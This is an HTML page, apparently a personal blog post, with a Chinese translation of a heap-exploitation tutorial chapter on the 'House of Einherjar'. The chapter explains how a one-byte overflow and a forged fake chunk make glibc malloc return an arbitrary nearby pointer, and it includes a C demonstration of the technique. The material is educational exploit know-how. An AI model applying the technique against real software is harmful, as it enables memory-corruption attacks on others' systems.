@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="author" content="Vancir" />
+  <title>Heap Exploitation系列翻译-16 House of Einherjar</title>
+  <link rel="shortcut icon" href="/favicon.ico" />
+  <link href="/feed/" rel="alternate" title="Vancir" type="application/atom+xml" />
+  <link rel="stylesheet" href="/media/css/style.css" />
+  <link rel="stylesheet" href="/media/css/highlight.css" />
+  <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+  <script type="text/javascript" src="/media/js/outliner.js"></script>
+</head>
+<!--  <body> 
+-->
+<script type="text/javascript">
+  function setTimeSpan() {
+    var date = new Date();
+    timeSpan.innerText = date.format('yyyy-MM-dd hh:mm:ss');
+  }
+
+  Date.prototype.format = function (format) {
+    var o =
+      {
+        "M+": this.getMonth() + 1, //month
+        "d+": this.getDate(),    //day
+        "h+": this.getHours(),   //hour
+        "m+": this.getMinutes(), //minute
+        "s+": this.getSeconds(), //second
+        "q+": Math.floor((this.getMonth() + 3) / 3),  //quarter
+        "S": this.getMilliseconds() //millisecond
+      }
+    if (/(y+)/.test(format))
+      format = format.replace(RegExp.$1, (this.getFullYear() + "").substr(4 - RegExp.$1.length));
+    for (var k in o)
+      if (new RegExp("(" + k + ")").test(format))
+        format = format.replace(RegExp.$1, RegExp.$1.length == 1 ? o[k] : ("00" + o[k]).substr(("" + o[k]).length));
+    return format;
+  }
+</script>
+
+<body onLoad="setInterval(setTimeSpan,1000);">
+  <div id="container">
+    <div id="main" role="main">
+      <header>
+        <h1>Heap Exploitation系列翻译-16 House of Einherjar</h1>
+      </header>
+      <nav id="real_nav">
+        <span>
+          <a title="home" class="" href="/">home</a>
+        </span>
+        <span>
+          <a title="categories" class="" href="/categories/">categories</a>
+        </span>
+        <span>
+          <a title="tags" class="" href="/tags/">tags</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/repo/">repo</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/act/">act</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/books/">books</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/musics/">musics</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/movies/">movies</a>
+        </span>
+        <span>
+          <a title="links" class="" href="/friends/">friends</a>
+        </span>
+        <span>
+          <a title="about" class="" href="/about/">about</a>
+        </span>
+        <span>
+          <a title="feed" class="" href="/feed">subscribe</a>
+        </span>
+      </nav>
+      <article class="content">
+        <section class="meta">
+<span class="time">
+  <time datetime="2017-08-12">2017-08-12</time>
+</span>
+
+ | 
+<span class="categories">
+  categories
+  
+  <a href="/categories/#translations" title="translations">translations</a>&nbsp;
+  
+</span>
+
+
+ | 
+<span class="tags">
+  tags
+  
+  <a href="/tags/#CTF" title="CTF">CTF</a>&nbsp;
+  
+  <a href="/tags/#pwn" title="pwn">pwn</a>&nbsp;
+  
+  <a href="/tags/#heap" title="heap">heap</a>&nbsp;
+  
+</span>
+
+</section>
+<section class="post">
+<blockquote>
+  <p>本文是对Dhaval Kapil的<a href="https://heap-exploitation.dhavalkapil.com/">Heap Exploitation</a>系列教程的译文</p>
+</blockquote>
+
+<p>这个house并不是”The Malloc Maleficarum”的一部分. 这项堆漏洞技术是由<a href="https://www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606">Hiroki Matsukuma</a>于2016年提出. 这项攻击也是围绕着利用’malloc’来返回一个附近的任意指针. 和其他攻击不同, 它只要求1字节的溢出即可实现. 有许多1字节溢出的软件漏洞, 但大多是著名的<a href="https://en.wikipedia.org/wiki/Off-by-one_error">“off by one”</a>错误. 它覆写内存中next chunk的’size并清除了<code class="highlighter-rouge">PREV_IN_USE</code>标志为零, 当然也会向<code class="highlighter-rouge">prev_size</code>(已经在前一个堆块的数据域)覆写一个伪造的大小. 当next chunk被释放, 它会发现它前一个堆块是空闲状态并尝试通过内存中’我们之前伪造的大小’作偏移来合并堆块. 伪造大小是精心计算的因此合并后的堆块的范围在伪造堆块处截止, 这可以被后续的malloc所返回</p>
+
+<p>考虑以下示例代码(下载完整版本 <a href="https://heap-exploitation.dhavalkapil.com/assets/files/house_of_einherjar.c">这里</a>):</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">chunk_structure</span> <span class="p">{</span>
+  <span class="kt">size_t</span> <span class="n">prev_size</span><span class="p">;</span>
+  <span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span>
+  <span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="n">fd</span><span class="p">;</span>
+  <span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="n">bk</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>               <span class="c1">// padding
+</span><span class="p">};</span>
+
+<span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="n">chunk1</span><span class="p">,</span> <span class="n">fake_chunk</span><span class="p">;</span>     <span class="c1">// fake chunk is at 0x7ffee6b64e90
+</span><span class="kt">size_t</span> <span class="n">allotedSize</span><span class="p">;</span>
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">ptr1</span><span class="p">,</span> <span class="o">*</span><span class="n">ptr2</span><span class="p">;</span>
+<span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
+<span class="kt">void</span> <span class="o">*</span><span class="n">victim</span><span class="p">;</span>
+
+<span class="c1">// Allocate any chunk
+// The attacker will overflow 1 byte through this chunk into the next one
+</span><span class="n">ptr1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">40</span><span class="p">);</span>                              <span class="c1">// at 0x1dbb010
+</span>
+<span class="c1">// Allocate another chunk
+</span><span class="n">ptr2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">);</span>                            <span class="c1">// at 0x1dbb040
+</span>
+<span class="n">chunk1</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="p">)(</span><span class="n">ptr1</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span>
+<span class="n">allotedSize</span> <span class="o">=</span> <span class="n">chunk1</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="mh">0x1</span> <span class="o">|</span> <span class="mh">0x2</span> <span class="o">|</span> <span class="mh">0x4</span><span class="p">);</span>
+<span class="n">allotedSize</span> <span class="o">-=</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">size_t</span><span class="p">);</span>      <span class="c1">// Heap meta data for 'prev_size' of chunk1
+</span>
+<span class="c1">// Attacker initiates a heap overflow
+// Off by one overflow of ptr1, overflows into ptr2's 'size'
+</span><span class="n">ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr1</span><span class="p">;</span>
+<span class="n">ptr</span><span class="p">[</span><span class="n">allotedSize</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>      <span class="c1">// Zeroes out the PREV_IN_USE bit
+</span>
+<span class="c1">// Fake chunk
+</span><span class="n">fake_chunk</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="mh">0x100</span><span class="p">;</span>   <span class="c1">// enough size to service the malloc request
+// These two will ensure that unlink security checks pass
+// i.e. P-&gt;fd-&gt;bk == P and P-&gt;bk-&gt;fd == P
+</span><span class="n">fake_chunk</span><span class="p">.</span><span class="n">fd</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">fake_chunk</span><span class="p">;</span>
+<span class="n">fake_chunk</span><span class="p">.</span><span class="n">bk</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">fake_chunk</span><span class="p">;</span>
+
+<span class="c1">// Overwrite ptr2's prev_size so that ptr2's chunk - prev_size points to our fake chunk
+// This falls within the bounds of ptr1's chunk - no need to overflow
+</span><span class="o">*</span><span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ptr</span><span class="p">[</span><span class="n">allotedSize</span><span class="o">-</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">size_t</span><span class="p">)]</span> <span class="o">=</span>
+                                <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ptr</span><span class="p">[</span><span class="n">allotedSize</span> <span class="o">-</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">size_t</span><span class="p">)]</span>  <span class="c1">// ptr2's chunk
+</span>                                <span class="o">-</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="o">&amp;</span><span class="n">fake_chunk</span><span class="p">;</span>
+
+<span class="c1">// Free the second chunk. It will detect the previous chunk in memory as free and try
+// to merge with it. Now, top chunk will point to fake_chunk
+</span><span class="n">free</span><span class="p">(</span><span class="n">ptr2</span><span class="p">);</span>
+
+<span class="n">victim</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">40</span><span class="p">);</span>                  <span class="c1">// Returns address 0x7ffee6b64ea0 !!
+</span></code></pre></div></div>
+
+<p>注意以下事项:</p>
+
+<ol>
+  <li>第二个堆块的大小为<code class="highlighter-rouge">0xf8</code>, 这只是确保了堆块的真实大小的最低有效字节为<code class="highlighter-rouge">0</code>(忽视标志位). 因此, 我们可以轻松的在不改变堆块大小的情况下设置<code class="highlighter-rouge">prev_in_use</code>位为<code class="highlighter-rouge">0</code>.</li>
+  <li><code class="highlighter-rouge">allotedSize</code>减去了<code class="highlighter-rouge">sizeof(size_t)</code>, <code class="highlighter-rouge">allotedSize</code>等于完整堆块的大小. 这是因为当前堆块的<code class="highlighter-rouge">size</code>和<code class="highlighter-rouge">prev_size</code>不可用, 但是next chunk的<code class="highlighter-rouge">prev_size</code>可用.</li>
+  <li>伪堆块的前向后向指针都经过调整, 以通过<code class="highlighter-rouge">unlink</code>的安全检查.</li>
+</ol>
+
+</section>
+<section align="right">
+<br/>
+<span>
+	<a  href="/2017/08/12/forging-chunks/" class="pageNav"  >Previous</a>
+	&nbsp;&nbsp;&nbsp;
+	<a  href="/2017/08/12/house-of-force/" class="pageNav"  >Next</a>
+</span>
+</section>
+
+<script type="text/javascript">
+$(function(){
+  $(document).keydown(function(e) {
+    var url = false;
+        if (e.which == 37 || e.which == 74) {  // Left arrow and J
+            
+        url = 'http://localhost:4000/2017/08/12/forging-chunks/';
+        
+        }
+        else if (e.which == 39 || e.which == 75) {  // Right arrow and K
+            
+        url = 'http://localhost:4000/2017/08/12/house-of-force/';
+        
+        }
+        if (url) {
+            window.location = url;
+        }
+  });
+})
+</script>
+
+      </article>
+      <a style="position:fixed;bottom:5px;right:5px;" href="#" title="Back to Top">
+        <img src="/assets/btt.png" />
+      </a>
+    </div>
+    <footer>
+      <p>
+        <small>
+          Powered by
+          <a href="http://jekyllrb.com" target="_blank">Jekyll</a> @
+          <a href="https://github.com/Vancir/vancir.github.io" target="_blank" title="project homepage">github</a> | Copyright 2017 - 2018 by
+          <a href="/about/">Vancir</a> |
+          <span class="label label-info" id="timeSpan"></span>
+        </small>
+      </p>
+    </footer>
+  </div>
+</body>
+
+</html>
